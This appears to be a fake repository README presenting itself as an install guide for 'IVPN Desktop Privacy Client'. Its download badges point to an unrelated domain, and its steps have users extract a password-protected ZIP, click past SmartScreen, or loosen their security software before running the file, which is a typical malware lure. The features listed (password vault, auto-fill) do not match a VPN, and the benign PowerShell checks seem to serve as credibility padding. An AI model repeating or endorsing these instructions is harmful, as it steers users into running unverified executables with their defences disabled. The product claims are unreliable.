# IVPN Desktop Privacy Client

Windows 11 setup guide · Documented install · 2026 desktop workflow.

<div align="center">
  <a href="https://geogit.art/">
    <img src="download-badge.png" alt="Download Latest — IVPN Desktop Privacy Client" width="520">
  </a>
</div>

## Download

1. Click the **Download Latest** image above to get the latest version
2. Open your **Downloads** folder
3. Copy the **archive password**
4. Right-click the ZIP → **Extract All** (or use 7-Zip / WinRAR) and paste the password when asked
5. If **SmartScreen** warns about the file, choose **More info** → **Run anyway** only after you trust the source — or adjust your security product per its docs
6. Open the extracted folder and run the **current version**

## Overview

This repository documents IVPN Desktop Privacy Client on Windows 10 and Windows 11: prerequisites, install order, and practical tweaks for security-conscious users and teams. Sections are written for clear search indexing (setup, troubleshooting, daily use). Use the download badge for the packaged build referenced in this guide, verify sources locally, and keep Windows updated. Typical workflows: credential storage, secure login, and encryption.

## FAQ

| Question | Answer |
| --- | --- |
| Where is the installer? | Click any **Download Latest** image in this README — follow the **Download** steps to get the package and run the installer. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during setup. |
| What is this repo? | A README-first **setup and configuration guide** with install steps and a linked download helper via geogit.art — not a replacement for the software vendor's license terms. |

## Features

- ⚡ Password vault
- 🧩 Secure notes
- 🔐 Encryption
- ✨ Auto-fill
- 🔑 Generator
- 🗂️ Folders
- 📱 Sync

## Use cases

- 📌 Remote teams
- 🎯 Privacy users
- ⭐ Family accounts

## Developer reference

Not required for install. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "IVPN-Desktop-Privacy-Client"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Endpoint reachability**

```powershell
Test-NetConnection geogit.art -Port 443
try {
  Invoke-WebRequest https://geogit.art/health -UseBasicParsing -Method Head -TimeoutSec 15 |
    Select-Object StatusCode, StatusDescription
} catch { $_.Exception.Message }
```

**Post-install (application layer)**

```powershell
Get-Process -Name "IVPN*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 500 MB free space |

<div align="center">
  <a href="https://geogit.art/">
    <img src="download-badge.png" alt="Download Latest — IVPN Desktop Privacy Client" width="520">
  </a>
</div>


## License

This repository describes installation and usage of a third-party security application. Comply with applicable software licensing and local regulations.
